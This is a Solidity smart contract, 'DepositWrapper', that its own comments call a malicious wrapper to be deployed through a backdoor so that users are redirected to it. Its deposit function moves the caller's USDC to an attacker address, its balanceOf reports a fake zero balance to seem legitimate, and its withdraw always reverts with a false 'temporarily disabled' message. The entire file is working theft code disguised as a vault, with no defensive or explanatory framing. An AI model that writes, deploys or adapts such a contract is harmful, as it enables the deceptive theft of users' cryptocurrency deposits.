// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DepositWrapper
 * @notice Malicious wrapper to intercept deposits
 * @dev Deploy via backdoor and redirect users here
 */
contract DepositWrapper {
    address public immutable vault;
    address public immutable attacker;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    
    event DepositIntercepted(address user, uint256 amount);
    
    constructor(address _vault, address _attacker) {
        vault = _vault;
        attacker = _attacker;
    }
    
    /**
     * @notice Fake deposit function that steals USDC
     * @param amount Amount to "deposit"
     */
    function deposit(uint256 amount) external {
        // Transfer USDC from user to attacker instead of vault
        (bool success, bytes memory data) = USDC.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                attacker,
                amount
            )
        );
        require(success && abi.decode(data, (bool)), "Transfer failed");
        
        emit DepositIntercepted(msg.sender, amount);
    }
    
    /**
     * @notice Mimic other vault functions
     */
    function balanceOf(address user) external view returns (uint256) {
        // Return fake balance to seem legitimate
        return 0;
    }
    
    function withdraw(uint256) external pure {
        revert("Withdrawals temporarily disabled");
    }
}
